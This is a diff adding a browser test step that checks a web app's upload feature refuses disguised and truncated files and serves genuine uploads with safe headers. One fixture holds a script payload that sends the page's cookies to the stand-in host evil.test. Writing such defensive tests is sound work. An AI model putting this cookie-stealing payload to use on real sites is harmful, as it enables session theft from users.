@@ -524,6 +524,29 @@ await step('refuse an executable upload', async () => {
   await P.reload();
   assert(!(await P.locator('main a', { hasText: 'virus.exe' }).count()), 'an .exe was accepted');
 });
+await step('disguised and damaged files are refused by what is inside them, not their names', async () => {
+  const fakes = [
+    file('results.png', 'image/png', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200)])),
+    file('readings.csv', 'text/csv', Buffer.from('<html><script>document.location="//evil.test?c="+document.cookie</script></html>')),
+    file('method.pdf', 'application/pdf', pdf.subarray(0, 40)),
+  ];
+  for (const fake of fakes) {
+    await P.setInputFiles(`#upload-${ids.experiment}`, fake);
+    await expectText(P, fake.name);
+  }
+  await P.waitForTimeout(1500);
+  stepErrors = stepErrors.filter((e) => !e.includes('status of 415'));
+  await P.reload();
+  for (const fake of fakes) {
+    assert(!(await P.locator('main a', { hasText: fake.name }).count()), `${fake.name} was accepted`);
+  }
+  // A genuine file comes back typed by its contents, and sandboxed.
+  const href = await P.locator('main a', { hasText: 'cuvette.png' }).first().getAttribute('href');
+  const headers = await P.evaluate(async (url) => Object.fromEntries((await fetch(url)).headers), href);
+  assert(headers['content-type'] === 'image/png', `served as ${headers['content-type']}`);
+  assert(headers['x-content-type-options'] === 'nosniff', 'no nosniff');
+  assert(/sandbox/.test(headers['content-security-policy'] ?? ''), 'not sandboxed');
+});
 await step('attach a link, add a note, change status, post a message', async () => {
   await P.fill('#link-url', 'https://docs.google.com/spreadsheets/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit');
   await P.fill('#link-label', 'Raw readings sheet');
